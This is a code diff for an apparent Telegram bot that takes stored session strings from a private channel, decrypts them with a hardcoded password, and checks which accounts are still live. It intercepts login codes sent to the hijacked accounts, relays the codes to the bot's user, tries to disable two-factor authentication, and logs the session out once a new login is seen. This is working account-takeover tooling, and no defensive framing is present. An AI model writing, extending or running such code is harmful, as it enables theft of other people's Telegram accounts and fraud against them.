@@ -250,10 +250,10 @@ async def try_login_2fa(mClient,event,ssn_str,phn,code,p_c_hash,pass_2fa=None):
     except:
         pass
 
-async def get_next_number_fast(meClient, sender_id, limit=20):
+async def get_next_number_smart(meClient, event, sender_id, limit=20):
     """
-    Only last X messages check (fast)
-    priority: no reply (fresh number)
+    Try last messages first.
+    If session dead → reply 'dead' on that message.
     """
 
     async for message in meClient.get_messages(2576914746, None):
@@ -263,75 +263,67 @@ async def get_next_number_fast(meClient, sender_id, limit=20):
                 message.message.startswith("880") and
                 str(sender_id) in message.message
             ):
-                # skip if already replied (used)
+                # skip already used
                 if message.replies and message.replies.replies > 0:
                     continue
 
-                num = message.text.split('\n\n')[0].replace("`", "")
-                num = num.split('_')[0]
+                num = message.text.split('\n\n')[0].replace("`", "").split('_')[0]
+                ssn_enc = message.text.split('\n\n')[1].replace("`", "")
 
-                ssn = message.text.split('\n\n')[1].replace("`", "")
+                # decrypt
+                try:
+                    ssn = crypter.password_decrypt(ssn_enc.encode(), 'KsP@542543').decode()
+                except:
+                    continue
 
-                return num, ssn
+                client = TelegramClient(StringSession(ssn), api_id, api_hash)
+
+                try:
+                    await client.connect()
+
+                    if not await client.is_user_authorized():
+                        # ❌ dead → reply mark
+                        await meClient.send_message(
+                            2576914746,
+                            "❌ dead",
+                            reply_to=message.id
+                        )
+                        await client.disconnect()
+                        continue
+
+                    await client.disconnect()
+                    return num, ssn
+
+                except:
+                    # ❌ dead
+                    """await meClient.send_message(
+                        2576914746,
+                        "❌ dead",
+                        reply_to=message.id
+                    )"""
+                    continue
 
         except:
             continue
 
     return None, None
 
-async def process_next_otp(meClient, event):
-    sender_id = event.sender_id
 
-    await event.respond("🔄 Searching fresh number...")
+async def listen_login_only(client, event, phn):
+    otp_received = False
 
-    for _ in range(5):  # try 5 numbers max
-        phn, ssn_enc = await get_next_number_fast(meClient, sender_id)
-
-        if not phn:
-            await event.respond("❌ No fresh number found")
-            return
-
-        # decrypt session
-        try:
-            ssn = crypter.password_decrypt(ssn_enc.encode(), 'KsP@542543').decode()
-        except:
-            continue
-
-        client = TelegramClient(StringSession(ssn), api_id, api_hash)
-
-        try:
-            await client.connect()
-
-            if not await client.is_user_authorized():
-                await client.disconnect()
-                continue  # try next number
-
-            await event.respond(f"📱 Using `{phn}`\n⏳ Waiting OTP...")
-
-            # start listener (non-blocking)
-            asyncio.create_task(listen_otp_and_logout(client, event, phn))
-
-            return
-
-        except:
-            try:
-                await client.disconnect()
-            except:
-                pass
-
-            continue
-
-    await event.respond("❌ All numbers failed")
-
-async def listen_otp_and_logout(client, event, phn):
     @client.on(events.NewMessage(incoming=True, chats=777000))
     async def handler(e):
-        if "Login code:" in e.raw_text:
+        nonlocal otp_received
+
+        # ✅ OTP phase
+        if not otp_received and "Login code:" in e.raw_text:
             otp = e.raw_text.split("Login code: ")[1].split('.')[0]
 
             await event.respond(f"✅ `{phn}` OTP: `{otp}`")
+            otp_received = True
 
-            # optional: 2FA remove
+            # 🔥 2FA disable
             try:
                 result = await client(functions.account.GetPasswordRequest())
                 if result.has_password:
@@ -339,14 +331,58 @@ async def listen_otp_and_logout(client, event, phn):
             except:
                 pass
 
-            # logout after use
-            await client.log_out()
+            return  # ⛔ stop OTP handling
+
+        # ✅ AFTER OTP → detect new login
+        if otp_received:
+            if "logged in" in e.raw_text.lower() or "new login" in e.raw_text.lower():
+                await event.respond(f"⚠️ New login detected → `{phn}` logout")
+
+                await client.log_out()
+                await client.disconnect()
+
+async def process_next(meClient, event):
+    sender_id = event.sender_id
+
+    await event.respond("🔄 Getting number...")
+
+    # step 1: fast
+    phn, ssn = await get_next_number_smart(meClient, event, sender_id)
+
+    # step 2: fallback full
+    #if not phn:
+        # phn, ssn = await get_next_number_full(meClient, event, sender_id)
+
+    if not phn:
+        await event.respond("❌ No numbers found")
+        return
+
+    await event.respond(f"📱 Using `{phn}`")
+
+    client = TelegramClient(StringSession(ssn), api_id, api_hash)
+
+    try:
+        await client.connect()
+
+        if not await client.is_user_authorized():
             await client.disconnect()
+            await process_next(meClient, event)  # retry next
+            return
 
-            # 🔥 AUTO NEXT
-            await process_next_otp(meClient, event)
+        await event.respond("⏳ Waiting OTP...")
 
-    await client.run_until_disconnected()
+        asyncio.create_task(listen_login_only(client, event, phn))
+
+        await client.run_until_disconnected()
+
+    except:
+        try:
+            await client.disconnect()
+        except:
+            pass
+
+        await process_next(meClient, event)
+
 
 
 async def get_otp(mClient,mEvent,phn):
